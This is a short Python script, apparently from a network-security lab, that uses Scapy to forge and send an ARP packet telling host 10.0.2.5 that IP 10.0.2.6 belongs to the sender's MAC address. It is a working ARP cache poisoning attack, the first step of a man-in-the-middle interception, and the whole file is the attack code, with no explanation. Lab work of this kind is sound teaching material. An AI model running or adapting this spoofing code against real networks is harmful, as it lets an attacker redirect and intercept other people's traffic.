#!/usr/bin/python3
from scapy.all import *

E = Ether(src='08:00:27:af:b1:f9', dst='08:00:27:4c:f9:c5')
A = ARP(hwsrc='08:00:27:af:b1:f9', psrc='10.0.2.6', 
	hwdst='08:00:27:4c:f9:c5', pdst='10.0.2.5')

pkt = E/A
pkt.show()
sendp(pkt)
